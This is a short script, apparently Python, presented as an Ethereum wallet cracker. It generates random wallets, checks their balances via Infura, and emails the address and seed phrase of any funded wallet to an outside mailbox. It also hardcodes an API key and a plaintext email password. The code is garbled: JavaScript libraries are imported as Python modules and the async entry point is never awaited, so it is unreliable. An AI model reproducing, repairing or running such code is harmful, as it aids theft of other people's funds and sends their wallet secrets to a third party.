import ethers
import nodemailer
import json

from ethers import providers, utils
from nodemailer import SMTP
from ethers.wallet import Wallet

API_KEY = "https://mainnet.infura.io/v3/267cf8a4393e43739b3dbace75de0030"
provider = providers.JsonRpcProvider(API_KEY)

async def send_email(wallet):
    with SMTP(host='smtp.protonmail.com', port=587) as transporter:
        transporter.starttls()
        transporter.login("ethsender@protonmail.com", "LubieChuje2137")

        mail_options = {
            'from': 'ethsender@protonmail.com',
            'to': 'crackedeth@proton.me',
            'subject': 'New Ethereum wallet found!',
            'text': f"Address: {wallet.address}\nMnemonic: {wallet.mnemonic.phrase}"
        }

        transporter.send_message(mail_options)

    print('Email sent!')

async def main():
    while True:
        wallet = Wallet.create_random()
        mnemonic = wallet.mnemonic.phrase
        address = wallet.address
        balance = utils.format_ether(await provider.get_balance(wallet.address))
        print(f"Balance: {balance}")

        if balance != '0.0':
            try:
                with open('cracked.json', 'r') as file:
                    cracked_data = json.load(file)
            except FileNotFoundError as err:
                print(err)
                continue

            cracked_data[address] = {'mnemonic': mnemonic, 'balance': balance}

            try:
                with open('cracked.json', 'w') as file:
                    json.dump(cracked_data, file, indent=4)
                await send_email(wallet)
            except IOError as err:
                print(err)
                continue

if __name__ == '__main__':
    main()
